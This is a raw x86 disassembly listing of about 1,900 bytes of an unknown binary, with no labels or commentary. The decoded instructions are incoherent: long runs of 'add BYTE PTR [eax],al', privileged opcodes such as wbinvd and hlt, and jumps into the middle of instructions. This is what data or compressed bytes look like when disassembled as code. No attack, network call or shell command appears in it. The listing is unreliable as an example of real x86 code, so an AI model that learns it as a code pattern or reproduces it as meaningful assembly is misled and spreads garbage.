  4046bd:	pusha  
  4046be:	bound  edx,QWORD PTR [esi]
  4046c0:	add    ah,BYTE PTR [eax]
  4046c2:	add    DWORD PTR [ebx],esp
  4046c4:	inc    edx
  4046c5:	dec    eax
  4046c6:	add    BYTE PTR [edx+0x481a4d15],ah
  4046cc:	pop    esp
  4046cd:	dec    eax
  4046ce:	adc    BYTE PTR [edx],al
  4046d0:	jle    0x4046d3
  4046d2:	lods   eax,DWORD PTR ds:[esi]
  4046d3:	add    BYTE PTR [eax],cl
  4046d5:	add    BYTE PTR [eax],al
  4046d7:	push   eax
  4046d8:	add    al,BYTE PTR [eax]
  4046da:	add    al,0x82
  4046dc:	inc    eax
  4046dd:	and    BYTE PTR [eax],al
  4046df:	add    ah,BYTE PTR [eax+0x40]
  4046e2:	and    BYTE PTR [eax],dl
  4046e4:	mov    BYTE PTR [eax+0x1000970],al
  4046ea:	inc    ebp
  4046eb:	mov    al,ds:0x2060044
  4046f0:	dec    eax
  4046f1:	adc    BYTE PTR [eax+0x8130400],dl
  4046f7:	and    DWORD PTR [eax+eax*2+0x1294200],eax
  4046fe:	and    al,0x40
  404700:	inc    eax
  404701:	push   eax
  404702:	es push eax
  404704:	add    BYTE PTR [eax+0x10],ah
  404707:	or     BYTE PTR [eax+0x16],al
  40470a:	add    BYTE PTR [eax],al
  40470c:	inc    ecx
  40470d:	add    al,0xc2
  40470f:	add    BYTE PTR [eax],al
  404711:	and    al,cl
  404713:	add    al,0x80
  404715:	push   eax
  404716:	popa   
  404717:	add    eax,0x84542818
  40471c:	xchg   BYTE PTR [ebp-0x6f7fdfc0],dl
  404722:	add    BYTE PTR [eax],ah
  404724:	add    edx,edx
  404726:	inc    eax
  404727:	add    DWORD PTR [eax],0x5211a000
  40472d:	adc    DWORD PTR [edx-0x5ef58000],ebp
  404733:	or     dl,BYTE PTR [ecx-0x80]
  404736:	inc    esp
  404737:	pusha  
  404738:	and    cl,BYTE PTR [ebp+0x4]
  40473b:	push   ecx
  40473c:	or     ah,BYTE PTR [eax+eax*1]
  40473f:	jo     0x40474d
  404741:	add    BYTE PTR [ecx+0xa32004e],al
  404747:	test   DWORD PTR [eax+0x48080400],eax
  40474d:	inc    eax
  40474e:	shl    BYTE PTR [eax],0x34
  404751:	adc    BYTE PTR [edx],al
  404753:	add    DWORD PTR [eax],eax
  404755:	xor    DWORD PTR [eax+0x4],eax
  404758:	mov    al,ds:0x8508801
  40475d:	add    BYTE PTR [edx+eax*4+0xa],al
  404761:	adc    al,0x36
  404763:	sub    BYTE PTR [eax],al
  404765:	and    al,BYTE PTR [eax]
  404767:	add    al,0x0
  404769:	and    eax,eax
  40476b:	and    al,0x2
  40476d:	pop    eax
  40476e:	add    BYTE PTR [eax],al
  404770:	sub    BYTE PTR [edx+0x30],dl
  404773:	and    al,cl
  404775:	adc    BYTE PTR [ecx+0x2000000],al
  40477b:	add    ah,al
  40477d:	or     cl,al
  40477f:	test   DWORD PTR [ecx+0x0],eax
  404782:	cwde   
  404783:	lea    ebx,[edx]
  404785:	add    BYTE PTR [eax],al
  404787:	or     BYTE PTR [eax+0x30],al
  40478a:	add    DWORD PTR [eax+eax*2+0x0],eax
  40478e:	add    BYTE PTR [edx],al
  404790:	adc    BYTE PTR [eax],al
  404792:	or     DWORD PTR [edx],eax
  404794:	add    al,0x8
  404796:	cmp    eax,0x4
  40479b:	push   edi
  40479c:	sub    BYTE PTR [eax],al
  40479e:	add    BYTE PTR [eax],ah
  4047a0:	add    DWORD PTR [eax],eax
  4047a2:	fs or  al,0x14
  4047a5:	or     BYTE PTR [esi],al
  4047a7:	add    al,0x41
  4047a9:	mov    BYTE PTR [eax],ah
  4047ab:	dec    edx
  4047ac:	inc    eax
  4047ad:	and    al,0x0
  4047af:	and    DWORD PTR [edx],0x1010000
  4047b5:	add    DWORD PTR [eax],eax
  4047b7:	push   eax
  4047b8:	and    BYTE PTR [eax],dl
  4047ba:	inc    eax
  4047bb:	add    BYTE PTR [eax*2+0x900000],0x30
  4047c3:	inc    eax
  4047c4:	add    BYTE PTR [eax],al
  4047c6:	add    BYTE PTR [eax+0x15e00040],ah
  4047cc:	add    BYTE PTR [eax],cl
  4047ce:	mov    cl,0x14
  4047d0:	add    BYTE PTR [eax],al
  4047d2:	inc    ecx
  4047d3:	inc    edx
  4047d4:	add    BYTE PTR [eax+0x5057c80],al
  4047da:	xor    dh,BYTE PTR [eax+0x11403144]
  4047e0:	add    BYTE PTR [edx+0xc],al
  4047e3:	and    BYTE PTR [ecx],al
  4047e5:	add    DWORD PTR [eax+0x400],eax
  4047eb:	add    BYTE PTR [eax],al
  4047ed:	pusha  
  4047ee:	add    BYTE PTR [ecx+edx*4+0x2009],al
  4047f5:	add    cl,ah
  4047f7:	and    BYTE PTR [edx+0xe],ch
  4047fa:	mov    WORD PTR [eax],es
  4047fc:	or     BYTE PTR [eax],dl
  4047fe:	add    BYTE PTR [eax],al
  404800:	add    DWORD PTR [ecx+0x1450880],eax
  404806:	add    BYTE PTR [eax],al
  404808:	add    DWORD PTR [eax],eax
  40480a:	add    DWORD PTR [edx+0xa],eax
  40480d:	add    BYTE PTR [eax+eax*2+0x50],al
  404811:	add    BYTE PTR [eax],al
  404813:	push   eax
  404814:	adc    BYTE PTR [edx],al
  404816:	test   DWORD PTR [eax],ecx
  404818:	add    BYTE PTR [edx+0x1],0x44
  40481c:	add    al,0x80
  40481e:	add    DWORD PTR [eax],esp
  404820:	add    BYTE PTR [eax],dl
  404822:	add    BYTE PTR [ecx],0xa
  404825:	and    cl,BYTE PTR [eax*4+0x10000045]
  40482c:	add    al,0x6
  40482e:	add    DWORD PTR ds:0x20401450,eax
  404834:	add    BYTE PTR [eax],al
  404836:	add    al,BYTE PTR [eax]
  404838:	and    BYTE PTR [eax],al
  40483a:	add    al,0x3c
  40483c:	and    BYTE PTR [eax],cl
  40483e:	add    BYTE PTR [eax],cl
  404840:	sbb    DWORD PTR [ecx+0x14461800],eax
  404846:	add    BYTE PTR [eax+0x40],cl
  404849:	add    BYTE PTR [edx],ah
  40484b:	nop
  40484c:	and    BYTE PTR [ecx],bl
  40484e:	add    BYTE PTR [eax],al
  404850:	inc    eax
  404851:	add    BYTE PTR [edx],dl
  404853:	inc    ecx
  404854:	add    BYTE PTR [eax],al
  404856:	mov    al,ds:0xa04c0010
  40485b:	adc    DWORD PTR [ecx],0x80426901
  404861:	dec    edx
  404862:	inc    eax
  404863:	push   edx
  404864:	or     BYTE PTR [edx],0x2
  404867:	add    BYTE PTR [esi+0x20],0x1
  40486b:	add    BYTE PTR [edx+0x20cc044],al
  404871:	or     dl,BYTE PTR [ecx+0x80c112]
  404877:	push   eax
  404878:	xor    ah,BYTE PTR [eax+0x72]
  40487b:	inc    eax
  40487c:	mov    al,ds:0x8a01040
  404881:	add    al,BYTE PTR [eax+0x1000088]
  404887:	inc    ebx
  404888:	add    BYTE PTR [eax],dl
  40488a:	add    BYTE PTR [eax+0x1004e1a1],cl
  404890:	rol    BYTE PTR [eax],0x5
  404893:	and    BYTE PTR [eax],al
  404895:	dec    eax
  404896:	add    al,BYTE PTR [eax]
  404898:	add    BYTE PTR [eax],al
  40489a:	xchg   esp,eax
  40489b:	pop    esp
  40489c:	add    BYTE PTR [eax],0x68
  40489f:	sbb    BYTE PTR [eax],al
  4048a1:	cwde   
  4048a2:	add    BYTE PTR [ecx+0x1],al
  4048a5:	add    al,0x0
  4048a7:	cmp    DWORD PTR [ecx],edx
  4048a9:	adc    DWORD PTR [edx],eax
  4048ab:	adc    DWORD PTR [eax+0x2588d80],ecx
  4048b1:	xor    BYTE PTR [eax],al
  4048b3:	and    BYTE PTR [eax+0x0],dl
  4048b6:	add    BYTE PTR [edx],al
  4048b8:	sub    BYTE PTR [eax],al
  4048ba:	add    DWORD PTR [eax],eax
  4048bc:	ret    0xa00e
  4048bf:	add    ah,BYTE PTR [esi+0x8005021]
  4048c5:	sub    al,0x2
  4048c7:	add    al,0x4a
  4048c9:	inc    esp
  4048ca:	add    BYTE PTR [ecx],al
  4048cc:	inc    edx
  4048cd:	mov    al,ds:0x45412004
  4048d2:	push   eax
  4048d3:	adc    al,0x50
  4048d5:	inc    eax
  4048d6:	test   eax,0x184220
  4048db:	mov    BYTE PTR [edx+0x20],cl
  4048de:	adc    BYTE PTR [edx+0x11],ah
  4048e1:	add    DWORD PTR [eax],ecx
  4048e3:	add    BYTE PTR [edx+edx*1],al
  4048e6:	shl    DWORD PTR [eax],0x44
  4048e9:	add    BYTE PTR [edx+0x0],al
  4048ec:	xchg   esi,eax
  4048ed:	mov    al,ds:0x20201110
  4048f2:	add    al,0x46
  4048f4:	or     al,BYTE PTR [ecx]
  4048f6:	add    cl,BYTE PTR [eax+0x44820000]
  4048fc:	adc    eax,0x42580010
  404901:	inc    eax
  404902:	and    BYTE PTR [eax+0x41300050],al
  404908:	pusha  
  404909:	add    BYTE PTR [ebp+0x0],dl
  40490c:	rcl    BYTE PTR [edx+edi*2],0x2
  404910:	add    eax,0xd0000816
  404915:	add    BYTE PTR [eax+0x5a],al
  404918:	adc    BYTE PTR [eax+0x60],ah
  40491b:	sub    DWORD PTR [eax],edx
  40491d:	or     BYTE PTR ds:0x884a40,0x89
  404924:	add    BYTE PTR [eax],cl
  404926:	and    DWORD PTR [edx],0x2802001
  40492c:	shl    BYTE PTR [eax],0x2
  40492f:	mov    eax,ds:0x401000
  404934:	add    DWORD PTR [ecx+eax*2],eax
  404937:	add    BYTE PTR [edx],bh
  404939:	add    BYTE PTR [eax],al
  40493b:	add    BYTE PTR [ecx],al
  40493d:	test   BYTE PTR [edx],ah
  40493f:	inc    eax
  404940:	and    BYTE PTR [eax+0x5c61ab],al
  404946:	add    DWORD PTR [eax],eax
  404948:	add    BYTE PTR [eax],ah
  40494a:	add    BYTE PTR [ecx+0x105a0500],ah
  404950:	or     al,BYTE PTR [eax]
  404952:	add    BYTE PTR [ecx],al
  404954:	add    BYTE PTR [ecx],dl
  404956:	add    al,0x0
  404958:	or     BYTE PTR [ecx],bl
  40495a:	and    BYTE PTR [eax+0x800402],al
  404960:	add    BYTE PTR [eax],al
  404962:	add    al,0xca
  404964:	add    BYTE PTR [eax],cl
  404966:	add    BYTE PTR [edi+0x2],al
  404969:	add    al,0x2
  40496b:	and    BYTE PTR [eax],0x1
  40496e:	pop    esp
  40496f:	and    BYTE PTR [eax+eax*1],al
  404972:	add    al,BYTE PTR [ebx]
  404974:	mov    al,ds:0x2220050
  404979:	sbb    BYTE PTR [eax+0x20c31040],ah
  40497f:	add    BYTE PTR [eax+0x78],ah
  404982:	add    BYTE PTR ds:0x2008c030,al
  404988:	sub    al,0x46
  40498a:	add    al,0xc0
  40498c:	add    BYTE PTR [ecx+0x49],cl
  40498f:	add    BYTE PTR [eax+eax*8],dl
  404992:	cwde   
  404993:	add    BYTE PTR [eax],al
  404995:	adc    BYTE PTR [ebp+0x2000804],dh
  40499b:	or     BYTE PTR [ecx],al
  40499d:	add    BYTE PTR [eax],al
  40499f:	add    al,BYTE PTR [edx]
  4049a1:	add    BYTE PTR [eax],al
  4049a3:	fadd   st,st(4)
  4049a5:	inc    eax
  4049a6:	imul   edx,DWORD PTR [edx],0x1003c082
  4049ac:	and    al,0x40
  4049ae:	add    BYTE PTR [eax],al
  4049b0:	arpl   WORD PTR [ecx],bp
  4049b2:	dec    esp
  4049b3:	test   cl,al
  4049b5:	pop    es
  4049b6:	sbb    BYTE PTR [ecx-0x5e],cl
  4049b9:	inc    eax
  4049ba:	add    cl,BYTE PTR [eax-0x4bdfc000]
  4049c0:	inc    esi
  4049c1:	mov    al,ds:0x228a600
  4049c6:	sbb    BYTE PTR [eax+0x13],bl
  4049c9:	add    BYTE PTR [eax-0x7affffe0],dl
  4049cf:	add    DWORD PTR [eax],eax
  4049d1:	dec    eax
  4049d2:	adc    BYTE PTR [eax],al
  4049d4:	or     BYTE PTR [eax+0x31],0x0
  4049d8:	test   eax,0x20004814
  4049dd:	add    ch,BYTE PTR [edx]
  4049df:	pop    eax
  4049e0:	adc    DWORD PTR [eax],ecx
  4049e2:	adc    BYTE PTR [eax],ch
  4049e4:	loopne 0x404a26
  4049e6:	mov    BYTE PTR [eax],cl
  4049e8:	and    al,0x60
  4049eb:	add    al,0x61
  4049ed:	mov    WORD PTR [esp+eax*1+0x10],es
  4049f1:	pusha  
  4049f2:	inc    ecx
  4049f3:	inc    eax
  4049f4:	add    DWORD PTR [eax],eax
  4049f6:	add    BYTE PTR [ecx+eax*4],0x40
  4049fa:	add    BYTE PTR [ebx],al
  4049fc:	or     BYTE PTR [ebx+0x40],al
  4049ff:	or     BYTE PTR [edx],al
  404a01:	or     ah,BYTE PTR [eax]
  404a03:	or     BYTE PTR ds:0x28002a8,0x0
  404a0a:	add    BYTE PTR [eax+0xf],ah
  404a0d:	add    BYTE PTR [esi+0x8],0x44
  404a11:	add    BYTE PTR [eax+0x40],al
  404a14:	and    BYTE PTR [eax+eax*1+0x42],al
  404a18:	add    BYTE PTR [eax],al
  404a1a:	add    BYTE PTR [eax],cl
  404a1c:	xor    al,BYTE PTR [eax]
  404a1e:	adc    BYTE PTR [eax+ebx*1],bh
  404a21:	add    BYTE PTR [eax],cl
  404a23:	adc    BYTE PTR [eax],dl
  404a25:	add    BYTE PTR [eax],al
  404a27:	add    al,BYTE PTR [eax]
  404a29:	sub    BYTE PTR [edx],dl
  404a2b:	add    al,BYTE PTR [eax]
  404a2d:	wbinvd 
  404a2f:	xchg   edx,eax
  404a30:	add    BYTE PTR [eax+ecx*1-0x17],al
  404a34:	sbb    al,BYTE PTR [eax]
  404a36:	and    BYTE PTR [eax+0x4042c428],al
  404a3c:	add    BYTE PTR [eax],cl
  404a3e:	adc    eax,eax
  404a40:	dec    eax
  404a41:	or     BYTE PTR [eax],al
  404a43:	add    BYTE PTR [edx],0x2
  404a46:	data16 or BYTE PTR [eax+0x4a1a0008],dl
  404a4d:	and    ah,ah
  404a4f:	add    BYTE PTR [ebp+0x20],ch
  404a52:	adc    dl,ah
  404a54:	or     BYTE PTR [ebp+0x242c0a2],al
  404a5a:	add    BYTE PTR [eax-0x7efb30f0],al
  404a60:	or     BYTE PTR [eax+0x40],cl
  404a63:	add    dl,BYTE PTR [edx]
  404a65:	add    BYTE PTR [eax-0x2f],ah
  404a68:	add    BYTE PTR [ebp+0x12202],ah
  404a6e:	add    DWORD PTR [edx-0x80],eax
  404a71:	pop    eax
  404a72:	mov    al,0x41
  404a74:	and    BYTE PTR [eax],dl
  404a76:	push   cs
  404a77:	add    BYTE PTR [eax],al
  404a79:	nop
  404a7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a7b:	push   esp
  404a7c:	push   eax
  404a7d:	inc    esi
  404a7e:	mov    al,BYTE PTR [esi+0x0]
  404a81:	xchg   edx,eax
  404a82:	adc    BYTE PTR [eax+0x10],dl
  404a85:	or     al,0x80
  404a87:	daa    
  404a88:	add    DWORD PTR [eax],eax
  404a8a:	and    DWORD PTR [eax],eax
  404a8c:	add    BYTE PTR [ebp+0xc],ch
  404a8f:	add    BYTE PTR [eax],al
  404a91:	add    al,0x0
  404a93:	add    BYTE PTR [eax],dl
  404a95:	adc    DWORD PTR [eax],eax
  404a97:	add    DWORD PTR [eax-0x80],ecx
  404a9a:	add    DWORD PTR [eax],esp
  404a9c:	ss add al,0x0
  404a9f:	add    BYTE PTR [eax],0x41
  404aa2:	or     esp,DWORD PTR [eax]
  404aa4:	add    BYTE PTR [ecx+eax*1+0x70224c],ah
  404aab:	add    BYTE PTR [eax],al
  404aad:	add    DWORD PTR [edx],ebx
  404aaf:	jno    0x404a39
  404ab1:	test   BYTE PTR [esi+eiz*1],bl
  404ab4:	and    DWORD PTR [eax+0x40],0x81304280
  404abb:	add    cl,BYTE PTR [eax+0x9620054]
  404ac1:	or     BYTE PTR [eax],al
  404ac3:	add    al,BYTE PTR [eax]
  404ac5:	push   es
  404ac6:	inc    edx
  404ac7:	adc    BYTE PTR [esi],al
  404ac9:	add    BYTE PTR [eax],ah
  404acb:	add    BYTE PTR [eax],al
  404acd:	add    BYTE PTR [edx],0x12
  404ad0:	push   esp
  404ad1:	dec    ebp
  404ad2:	mov    DWORD PTR [eax],eax
  404ad4:	add    BYTE PTR [esi],0x40
  404ad7:	add    cl,BYTE PTR [ecx]
  404ad9:	add    BYTE PTR [eax],al
  404adb:	adc    al,al
  404add:	add    BYTE PTR [eax],0x40
  404ae0:	inc    eax
  404ae1:	add    BYTE PTR [eax],al
  404ae3:	dec    ebp
  404ae4:	add    ecx,DWORD PTR [ecx+eax*1+0x4]
  404ae8:	mov    BYTE PTR [edx],al
  404aea:	add    BYTE PTR [eax],cl
  404aec:	inc    esp
  404aed:	push   es
  404aee:	or     BYTE PTR [edx+0x4000000],al
  404af4:	add    BYTE PTR ds:0x5040000,al
  404afa:	add    BYTE PTR [ebx+0x1018421],al
  404b00:	dec    eax
  404b01:	or     BYTE PTR [eax],0x80
  404b04:	ins    BYTE PTR es:[edi],dx
  404b05:	or     DWORD PTR [edx+0x0],eax
  404b08:	add    BYTE PTR [eax],al
  404b0a:	dec    edx
  404b0b:	push   es
  404b0c:	sbb    BYTE PTR [eax+0x0],cl
  404b0f:	or     BYTE PTR [eax+0x1],ah
  404b12:	inc    ecx
  404b13:	mov    al,ds:0xc181031
  404b18:	add    BYTE PTR [eax],0x7
  404b1b:	inc    eax
  404b1c:	inc    eax
  404b1d:	add    BYTE PTR [eax],al
  404b1f:	inc    eax
  404b20:	and    BYTE PTR [eax],cl
  404b22:	add    BYTE PTR [ecx],al
  404b24:	add    al,0x0
  404b26:	add    al,BYTE PTR [eax-0x80]
  404b29:	cs add al,0x53
  404b2c:	add    BYTE PTR [eax],al
  404b2e:	pusha  
  404b2f:	and    DWORD PTR [esi],esp
  404b31:	add    dl,BYTE PTR [eax]
  404b33:	add    BYTE PTR [eax],0x40
  404b36:	adc    DWORD PTR [eax],eax
  404b38:	add    BYTE PTR [eax],0x40
  404b3b:	adc    DWORD PTR [eax+0x2],eax
  404b3e:	add    al,0x20
  404b40:	inc    eax
  404b41:	add    BYTE PTR [esi+0x43204014],ah
  404b47:	and    BYTE PTR [eax+eiz*1+0x884800],dh
  404b4e:	and    DWORD PTR [eax-0x7ef73e80],eax
  404b54:	xor    BYTE PTR ds:0x81234,al
  404b5a:	data16 add BYTE PTR [ecx-0x80],al
  404b5e:	add    eax,DWORD PTR [eax+eax*4-0x80]
  404b62:	add    DWORD PTR [eax],0xdb380100
  404b68:	inc    eax
  404b69:	sub    BYTE PTR [eax],0x3
  404b6c:	add    BYTE PTR [eax],ah
  404b6e:	rcl    ch,0x10
  404b71:	add    BYTE PTR [ecx],al
  404b73:	mov    BYTE PTR [eax+eax*4],cl
  404b76:	inc    ebx
  404b77:	add    dl,BYTE PTR [eax]
  404b79:	inc    edx
  404b7a:	add    BYTE PTR [eax],0x0
  404b7d:	inc    eax
  404b7e:	add    al,BYTE PTR [edx]
  404b80:	add    BYTE PTR [esp+eax*1],0x8
  404b84:	add    BYTE PTR [eax],al
  404b86:	inc    eax
  404b87:	add    BYTE PTR [eax],cl
  404b89:	mov    eax,DWORD PTR [eax]
  404b8b:	imul   ebp,DWORD PTR [edi],0x513015
  404b91:	inc    edx
  404b92:	add    BYTE PTR [eax],dl
  404b94:	adc    BYTE PTR [eax+0x0],0x0
  404b98:	add    al,BYTE PTR [ecx+0x20]
  404b9b:	sub    BYTE PTR [edx+0x20],al
  404b9e:	adc    BYTE PTR [eax],dl
  404ba0:	add    al,bl
  404ba2:	mov    ecx,0x39c0200
  404ba7:	and    al,0x2
  404ba9:	inc    esp
  404baa:	inc    edx
  404bab:	add    eax,ecx
  404bad:	mov    BYTE PTR [eax+eax*8+0x40],al
  404bb1:	add    BYTE PTR ds:0xad,cl
  404bb7:	and    al,BYTE PTR [ecx]
  404bb9:	add    BYTE PTR [ecx],al
  404bbb:	adc    BYTE PTR [edx+ecx*1+0x305214c],dl
  404bc2:	inc    edx
  404bc3:	add    ah,0x0
  404bc6:	add    BYTE PTR [edx-0x73ffbcaf],al
  404bcc:	and    BYTE PTR [esi+0x1],ah
  404bcf:	xchg   ebx,eax
  404bd0:	add    BYTE PTR [eax+0x20],bl
  404bd3:	add    DWORD PTR [eax],esp
  404bd5:	add    eax,edx
  404bd7:	add    DWORD PTR [edx],0x82081
  404bdd:	and    BYTE PTR [eax],ah
  404bdf:	nop
  404be0:	add    BYTE PTR [ecx],al
  404be2:	and    BYTE PTR [ebx],al
  404be4:	nop
  404be5:	sub    DWORD PTR [ecx],eax
  404be7:	add    al,al
  404be9:	inc    eax
  404bea:	rol    BYTE PTR [eax],1
  404bec:	inc    eax
  404bed:	adc    BYTE PTR [eax],al
  404bef:	adc    BYTE PTR [esi+0x0],bl
  404bf2:	add    BYTE PTR [eax+eax*4+0x0],al
  404bf6:	add    DWORD PTR [eax],esp
  404bf8:	inc    esp
  404bf9:	and    al,BYTE PTR [esi+eiz*4]
  404bfc:	mov    al,ds:0x75000020
  404c01:	add    al,BYTE PTR [eax+eax*4+0x8]
  404c05:	and    BYTE PTR [eax],al
  404c07:	inc    eax
  404c08:	xor    al,0x22
  404c0a:	add    DWORD PTR [edx+0x1],eax
  404c0d:	add    BYTE PTR [ecx],al
  404c0f:	add    BYTE PTR [ecx],al
  404c11:	rol    BYTE PTR [edx],0xe0
  404c14:	add    BYTE PTR [eax],cl
  404c16:	push   0x26004018
  404c1b:	add    BYTE PTR [eax],ah
  404c1d:	rcl    BYTE PTR [eax],cl
  404c1f:	xor    BYTE PTR [eax+0x48],al
  404c22:	push   edx
  404c23:	inc    ebx
  404c24:	inc    esp
  404c25:	add    DWORD PTR [edx+eax*2],esp
  404c28:	nop
  404c29:	add    ah,BYTE PTR [ecx+0x4e0021]
  404c2f:	add    eax,0x80c07
  404c34:	or     BYTE PTR [ecx],al
  404c36:	add    BYTE PTR [eax+0x40000002],cl
  404c3c:	inc    esi
  404c3d:	cmp    BYTE PTR [eax],ah
  404c3f:	or     al,BYTE PTR [esp+eax*1+0x60004840]
  404c46:	pusha  
  404c47:	adc    BYTE PTR [edx+eiz*2],dl
  404c4a:	sbb    al,al
  404c4c:	dec    ecx
  404c4d:	popa   
  404c4e:	add    dl,BYTE PTR [eax+0x810200]
  404c54:	and    BYTE PTR [eax],al
  404c56:	add    BYTE PTR [eax],dl
  404c58:	test   BYTE PTR [eax+ecx*1],dl
  404c5b:	add    BYTE PTR [eax],cl
  404c5d:	push   eax
  404c5e:	nop
  404c5f:	or     al,0xf0
  404c61:	add    BYTE PTR fs:[eax],al
  404c64:	add    cl,ah
  404c66:	adc    al,0x13
  404c68:	add    BYTE PTR [edx],al
  404c6a:	or     BYTE PTR [ecx+0x40000080],al
  404c70:	sub    BYTE PTR [eax],al
  404c72:	dec    eax
  404c73:	inc    esp
  404c74:	xchg   ebp,eax
  404c75:	jno    0x404c77
  404c77:	add    BYTE PTR [ecx+0x28800110],al
  404c7d:	or     BYTE PTR [eax],al
  404c7f:	add    BYTE PTR [eax],al
  404c81:	add    BYTE PTR [eax+0x0],dl
  404c84:	les    eax,FWORD PTR [ecx-0x7fff35ae]
  404c8a:	xchg   edx,eax
  404c8b:	or     DWORD PTR [eax],edx
  404c8d:	nop
  404c8e:	dec    eax
  404c8f:	mov    DWORD PTR [edx+0x358300d0],0x40c021
  404c99:	dec    eax
  404c9a:	add    BYTE PTR [eax],al
  404c9c:	add    DWORD PTR [eax+0x18],esp
  404c9f:	and    DWORD PTR [eax],eax
  404ca1:	sbb    BYTE PTR [ecx],al
  404ca3:	adc    BYTE PTR [eax],al
  404ca5:	or     BYTE PTR [eax+0x48000100],al
  404cab:	mov    esp,DWORD PTR [eax+0x0]
  404cae:	push   esp
  404caf:	and    BYTE PTR [eax],dh
  404cb1:	add    eax,0x1c1600cb
  404cb6:	add    BYTE PTR [ecx],dl
  404cb8:	add    al,BYTE PTR [eax+0x4323b0]
  404cbe:	adc    DWORD PTR [eax],eax
  404cc0:	mov    al,BYTE PTR [eax+eax*2]
  404cc3:	and    DWORD PTR [eax],eax
  404cc5:	dec    eax
  404cc6:	dec    ecx
  404cc7:	add    BYTE PTR [esi+0x40],ch
  404cca:	adc    BYTE PTR [ecx+0x20],0x0
  404cce:	add    al,0x0
  404cd0:	add    BYTE PTR [eax],0x52
  404cd3:	je     0x404cd5
  404cd5:	inc    eax
  404cd6:	dec    eax
  404cd7:	cmp    DWORD PTR [eax+0x52],eax
  404cda:	rol    DWORD PTR [eax],0x24
  404cdd:	add    BYTE PTR [ebx-0x2f],cl
  404ce0:	inc    ecx
  404ce1:	and    BYTE PTR [eax],al
  404ce3:	hlt    
  404ce4:	add    BYTE PTR [eax+0x70402707],al
  404cea:	add    DWORD PTR fs:[eax+0x10],ebx
  404cee:	xor    bl,BYTE PTR [eax]
  404cf0:	add    BYTE PTR [esi],ah
  404cf2:	add    DWORD PTR [eax+0x61],0x126121
  404cf9:	add    BYTE PTR [eax+eiz*1],ch
  404cfc:	add    dh,al
  404cfe:	inc    ebx
  404cff:	adc    BYTE PTR [eax+0x20020a02],0x2
  404d06:	add    BYTE PTR [esi],dl
  404d08:	adc    eax,DWORD PTR [ecx]
  404d0a:	mov    ds:0x600012,al
  404d0f:	mov    WORD PTR [eax],cs
  404d11:	and    al,BYTE PTR [eax+eiz*1+0x40]
  404d15:	and    DWORD PTR [eax],eax
  404d17:	add    BYTE PTR [ecx],ah
  404d19:	add    BYTE PTR [eax],al
  404d1b:	add    BYTE PTR [edx],cl
  404d1d:	add    DWORD PTR [eax],eax
  404d1f:	add    BYTE PTR [eax],dl
  404d21:	add    BYTE PTR [ecx],ch
  404d23:	add    BYTE PTR [eax+0x12],al
  404d26:	dec    eax
  404d27:	test   DWORD PTR [ebx],ecx
  404d29:	push   esi
  404d2a:	adc    al,BYTE PTR [eax+eax*4]
  404d2d:	xchg   DWORD PTR [ebx],edx
  404d2f:	inc    ecx
  404d30:	or     BYTE PTR [eax+0x4d200085],al
  404d36:	push   es
  404d37:	add    BYTE PTR [edx],dl
  404d39:	add    al,0x80
  404d3b:	add    al,BYTE PTR [eax]
  404d3d:	cdq    
  404d3e:	add    al,BYTE PTR [eax+ecx*1]
  404d41:	inc    eax
  404d42:	rcl    BYTE PTR [eax],1
  404d44:	add    BYTE PTR [edx+0x1],al
  404d47:	enter  0x0,0x80
  404d4b:	add    DWORD PTR [eax],ecx
  404d4d:	rol    BYTE PTR [esi],0x0
  404d50:	add    BYTE PTR [eax],0x34
  404d53:	adc    eax,0x288000
  404d58:	mov    BYTE PTR [eax+0x400],0x50
  404d5f:	add    DWORD PTR [eax],eax
  404d61:	mov    WORD PTR [esp+eax*1-0x68],cs
  404d65:	or     BYTE PTR [eax],cl
  404d67:	cs add al,0x92
  404d6a:	rol    DWORD PTR [eax],0x36
  404d6d:	adc    BYTE PTR [eax],al
  404d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d70:	push   es
  404d71:	add    dl,BYTE PTR [ebp+0x10]
  404d74:	and    BYTE PTR [eax],al
  404d76:	inc    esp
  404d77:	adc    BYTE PTR [eax],dl
  404d79:	ret    
  404d7a:	dec    eax
  404d7b:	nop
  404d7c:	or     BYTE PTR [edx+edx*1-0x6e],al
  404d80:	inc    eax
  404d81:	mov    DWORD PTR [eax],eax
  404d83:	test   BYTE PTR [esp+ecx*1+0x1201aaa],cl
  404d8a:	add    BYTE PTR [ebx],al
  404d8c:	or     al,dl
  404d8e:	add    BYTE PTR [eax+0x2],ah
  404d91:	jl     0x404dd3
  404d93:	sub    BYTE PTR [ecx],al
  404d95:	inc    eax
  404d96:	adc    DWORD PTR [eax],edx
  404d98:	add    bl,BYTE PTR [eax]
  404d9a:	add    BYTE PTR [eax],al
  404d9c:	and    BYTE PTR [eax],al
  404d9e:	jne    0x404da8
  404da0:	test   al,0x1
  404da2:	pusha  
  404da3:	and    cl,BYTE PTR [eax]
  404da5:	adc    al,BYTE PTR [eax+0x40]
  404da8:	add    BYTE PTR [eax-0x1cdff4c0],cl
  404dae:	sub    BYTE PTR [eax],cl
  404db0:	lods   al,BYTE PTR ds:[esi]
  404db1:	add    BYTE PTR [eax],ch
  404db3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404db4:	lds    edx,FWORD PTR [eax-0x7ffefff1]
  404dba:	add    BYTE PTR [eax],ah
  404dbc:	add    dl,al
  404dbe:	add    BYTE PTR [eax],ah
  404dc0:	dec    ecx
  404dc1:	add    BYTE PTR [eax],bl
  404dc3:	or     ecx,DWORD PTR [edx-0x70]
  404dc6:	mov    al,0x2
  404dc8:	inc    eax
  404dc9:	mov    al,ds:0x20d41150
  404dce:	inc    ecx
  404dcf:	adc    al,BYTE PTR [edx]
  404dd1:	inc    eax
  404dd2:	jp     0x404dd5
  404dd4:	inc    esp
  404dd5:	add    BYTE PTR [eax],bl
  404dd7:	add    al,BYTE PTR [eax]
  404dd9:	add    BYTE PTR [eax],al
  404ddb:	inc    edx
  404ddc:	add    BYTE PTR [esp+eax*1],0x14
  404de0:	and    BYTE PTR [ebp+0x8c00450],al
  404de6:	add    BYTE PTR [esp+esi*2],bl
  404de9:	add    BYTE PTR [eax+eax*2],dl
  404dec:	adc    BYTE PTR [edx-0x6abff77e],0x1
  404df3:	adc    BYTE PTR [eax],al
  404df5:	add    al,BYTE PTR [edi]
  404df7:	and    BYTE PTR [eax],cl
  404df9:	or     BYTE PTR [eax+0x0],al
  404dfc:	add    eax,0x21400010
  404e01:	push   ds
  404e02:	mov    WORD PTR ds:0xc6d01300,fs
  404e08:	rol    BYTE PTR [eax],0x50
  404e0b:	pop    ds
  404e0c:	add    al,0x44
